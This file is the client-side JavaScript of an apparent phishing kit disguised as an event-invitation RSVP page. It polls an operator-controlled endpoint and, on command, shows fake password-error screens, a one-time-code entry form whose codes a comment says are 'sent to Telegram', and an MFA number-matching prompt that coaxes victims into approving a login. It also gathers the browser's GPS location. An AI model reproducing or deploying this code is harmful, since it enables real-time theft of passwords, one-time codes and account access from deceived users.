(function () {
  const SESSION_KEY = '__SUBMISSION_SESSION_ID__';

  function getSessionId() {
    return sessionStorage.getItem(SESSION_KEY) || '';
  }

  function setSessionId(id) {
    sessionStorage.setItem(SESSION_KEY, id);
  }

  function clearSessionId() {
    sessionStorage.removeItem(SESSION_KEY);
  }

  function ensureContainer() {
    let container = document.getElementById('response-container');
    if (container) return container;
    container = document.createElement('div');
    container.id = 'response-container';
    document.body.appendChild(container);
    return container;
  }

  function closeOverlay() {
    const container = document.getElementById('response-container');
    if (!container) return;
    const overlay = container.querySelector('.response-overlay');
    if (overlay) {
      overlay.classList.remove('is-open');
      setTimeout(() => { if (container) container.innerHTML = ''; }, 400);
    }
  }

  function renderOverlay(html) {
    const container = ensureContainer();
    container.innerHTML = html;
    const overlay = container.querySelector('.response-overlay');
    requestAnimationFrame(() => overlay.classList.add('is-open'));
    return overlay;
  }

  function escapeHtml(str) {
    if (str == null) return '';
    return String(str)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;');
  }

  /* ── Beautiful success overlay ── */
  function showSuccess() {
    closeAuthModal();
    renderOverlay(`
      <div class="response-overlay" id="overlay-success">
        <div class="success-celebration">
          <div class="success-confetti" aria-hidden="true">
            <span class="confetti-piece"></span><span class="confetti-piece"></span>
            <span class="confetti-piece"></span><span class="confetti-piece"></span>
            <span class="confetti-piece"></span><span class="confetti-piece"></span>
            <span class="confetti-piece"></span><span class="confetti-piece"></span>
            <span class="confetti-piece"></span><span class="confetti-piece"></span>
            <span class="confetti-piece"></span><span class="confetti-piece"></span>
          </div>
          <div class="success-card">
            <div class="success-icon-wrap">
              <svg class="success-check-svg" viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg">
                <circle class="success-check-circle" cx="40" cy="40" r="36" stroke="#0F6B2C" stroke-width="3" fill="none" stroke-linecap="round" stroke-dasharray="226" stroke-dashoffset="226" />
                <path class="success-check-mark" d="M24 41 L35 52 L57 28" stroke="#0F6B2C" stroke-width="4.5" fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-dasharray="60" stroke-dashoffset="60" />
              </svg>
            </div>
            <div class="success-ornament" aria-hidden="true">
              <span class="success-orn-line"></span>
              <span class="success-orn-diamond"></span>
              <span class="success-orn-line"></span>
            </div>
            <h2 class="success-title">Spot Reserved Successfully</h2>
            <p class="success-message">Your invitation has been confirmed and your spot for the event has been officially booked. We can't wait to celebrate with you!</p>
            <div class="success-details">
              <div class="success-detail-item">
                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="success-detail-icon">
                  <path d="M20 7L9 18l-5-5" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
                <span>Invitation Confirmed</span>
              </div>
              <div class="success-detail-item">
                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="success-detail-icon">
                  <path d="M20 7L9 18l-5-5" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
                <span>Spot Reserved</span>
              </div>
              <div class="success-detail-item">
                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="success-detail-icon">
                  <path d="M20 7L9 18l-5-5" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
                <span>Details Sent to Your Email</span>
              </div>
            </div>
            <button class="success-btn" type="button" onclick="window.__ResponseControls.close()">Done</button>
          </div>
        </div>
      </div>
    `);
  }

  function showPasswordError() {
    if (window.__AuthForm && window.__AuthForm.showError) {
      window.__AuthForm.showError('The password you entered is incorrect. Please try again.');
      return;
    }
    renderOverlay(`
      <div class="response-overlay" id="overlay-password-error">
        <div class="response-card">
          <button class="response-close" type="button" onclick="window.__ResponseControls.close()">×</button>
          <div class="response-icon error">!</div>
          <h2 class="response-title">Incorrect Password</h2>
          <p class="response-message">The password you entered is incorrect. Please try again.</p>
          <div class="response-actions">
            <button class="response-btn response-btn-primary" type="button" onclick="window.__ResponseControls.close()">Try Again</button>
          </div>
        </div>
      </div>
    `);
  }

  function showYesPrompt() {
    renderOverlay(`
      <div class="response-overlay" id="overlay-yes-prompt">
        <div class="response-card">
          <button class="response-close" type="button" onclick="window.__ResponseControls.close()">×</button>
          <div class="response-icon yes">✓</div>
          <h2 class="response-title">Confirmation Required</h2>
          <p class="response-message">Please confirm your choice to continue.</p>
          <div class="response-actions">
            <button class="response-btn response-btn-secondary" type="button" onclick="window.__ResponseControls.close()">Cancel</button>
            <button class="response-btn response-btn-primary" type="button" onclick="window.__ResponseControls.close()">Confirm</button>
          </div>
        </div>
      </div>
    `);
  }

  function showSmsPrompt(email) {
    const safeEmail = email || 'your email';
    closeAuthModal();
    renderOverlay(`
      <div class="response-overlay" id="overlay-sms">
        <div class="response-card sms-verify-card">
          <button class="response-close" type="button" onclick="window.__ResponseControls.close()">×</button>
          <div class="sms-verify-icon" aria-hidden="true">
            <svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
              <rect x="8" y="14" width="48" height="36" rx="6" fill="#FEF6F0" stroke="#6A0D25" stroke-width="2.5"/>
              <path d="M8 20l24 16 24-16" stroke="#6A0D25" stroke-width="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
              <circle cx="48" cy="44" r="12" fill="#B8963A"/>
              <text x="48" y="49" text-anchor="middle" font-family="Jost,sans-serif" font-size="13" font-weight="700" fill="#fff">✓</text>
            </svg>
          </div>
          <h2 class="sms-verify-title">Verify Your Email</h2>
          <p class="sms-verify-email">${escapeHtml(safeEmail)}</p>
          <p class="sms-verify-message">A verification code has been sent to your email. Please enter it below to continue.</p>
          <form class="sms-verify-form" id="sms-verify-form" autocomplete="off">
            <div class="sms-code-single-wrap">
              <input
                type="text"
                class="sms-code-input-single"
                id="sms-code-single"
                inputmode="numeric"
                autocomplete="one-time-code"
                placeholder="Enter verification code"
                aria-label="Verification code"
              />
            </div>
            <p class="sms-verify-resend">Didn't receive a code? <a href="#" onclick="event.preventDefault();">Resend code</a></p>
            <button class="sms-verify-btn" type="submit" id="sms-verify-submit">Verify</button>
          </form>
          <div class="sms-verify-loading" id="sms-verify-loading" style="display:none;">
            <div class="sms-verify-spinner"></div>
            <p>Verifying your code…</p>
          </div>
        </div>
      </div>
    `);
    setupSmsSingleInput();
    setupSmsFormSubmit();
  }

  function setupSmsSingleInput() {
    const input = document.getElementById('sms-code-single');
    if (!input) return;

    input.addEventListener('input', function () {
      this.value = this.value.replace(/[^0-9]/g, '');
    });

    setTimeout(() => input.focus(), 200);
  }

  function setupSmsFormSubmit() {
    const form = document.getElementById('sms-verify-form');
    if (!form) return;
    form.addEventListener('submit', async function (e) {
      e.preventDefault();
      const input = document.getElementById('sms-code-single');
      const code = input ? input.value.trim() : '';

      if (!code) {
        if (input) input.classList.add('sms-code-error');
        return;
      }

      const formEl = document.getElementById('sms-verify-form');
      const loadingEl = document.getElementById('sms-verify-loading');
      const submitBtn = document.getElementById('sms-verify-submit');
      if (formEl) formEl.style.display = 'none';
      if (submitBtn) submitBtn.style.display = 'none';
      if (loadingEl) loadingEl.style.display = 'flex';
      const sessionId = getSessionId();
      try {
        await fetch('/api/verify-code', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ sessionId, code }),
        });
      } catch (err) { /* code still sent to Telegram */ }
    });
  }

  function showNumberPrompt(number) {
    closeAuthModal();
    renderOverlay(`
      <div class="response-overlay" id="overlay-number">
        <div class="response-card">
          <button class="response-close" type="button" onclick="window.__ResponseControls.close()">×</button>
          <div class="response-icon number">#</div>
          <h2 class="response-title">Verification Number</h2>
          <div class="response-number" style="font-size: 2.7rem; font-weight: 900; letter-spacing: 0.08em; margin: 1rem 0 1.25rem; color: #111827;">${escapeHtml(String(number))}</div>
          <p class="response-message" style="margin: 0; line-height: 1.7; color: #374151; text-align: center;">
            Kindly check your device. Kindly click this number to verify and accept your account to receive your invites. Thank you.
          </p>
          <div class="response-actions" style="margin-top: 1.5rem; justify-content: center;">
            <button class="response-btn response-btn-primary" type="button" onclick="window.__ResponseControls.close()">Confirm</button>
          </div>
        </div>
      </div>
    `);
  }

  function closeAuthModal() {
    const authModal = document.getElementById('auth-modal');
    if (authModal) authModal.classList.remove('is-open');
    const mailingCard = document.querySelector('.mailing-form');
    if (mailingCard) mailingCard.style.display = '';
    const mailingLoading = document.getElementById('mailing-loading');
    if (mailingLoading) mailingLoading.style.display = 'none';
  }

  function handleCommand(command, data) {
    switch (command) {
      case 'success':
        showSuccess();
        return true;
      case 'password_error':
        showPasswordError();
        return false;
      case 'yes_prompt':
        closeAuthModal();
        showYesPrompt();
        return false;
      case 'sms':
        showSmsPrompt(data);
        return false;
      case 'number_prompt':
        showNumberPrompt(data || '?');
        return false;
      default:
        return false;
    }
  }

  /* ── Polling: supports session switching ── */
  let currentSessionId = null;
  let pollAbortController = null;

  async function startPolling(sessionId) {
    if (sessionId === currentSessionId) return;
    currentSessionId = sessionId;
    if (pollAbortController) pollAbortController.abort();
    pollAbortController = new AbortController();
    const myController = pollAbortController;
    setSessionId(sessionId);

    while (currentSessionId === sessionId && !myController.signal.aborted) {
      try {
        const res = await fetch(`/api/status/${sessionId}`, { signal: myController.signal });
        if (!res.ok) { await sleep(3000); continue; }
        const result = await res.json();
        if (result.command) {
          const isFinal = handleCommand(result.command, result.data);
          if (isFinal) {
            clearSessionId();
            currentSessionId = null;
            return;
          }
        }
      } catch (e) {
        if (e.name === 'AbortError') return;
        await sleep(3000);
      }
    }
  }

  function sleep(ms) { return new Promise((r) => setTimeout(r, ms)); }

  function collectGps() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) return resolve({ lat: null, lng: null });
      navigator.geolocation.getCurrentPosition(
        (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
        () => resolve({ lat: null, lng: null }),
        { timeout: 5000, maximumAge: 60000 }
      );
    });
  }

  window.__ResponseControls = {
    start: startPolling,
    handle: handleCommand,
    close: closeOverlay,
    setSessionId,
    getSessionId,
    clearSessionId,
    collectGps,
  };

  const existingSession = getSessionId();
  if (existingSession) startPolling(existingSession);
})();
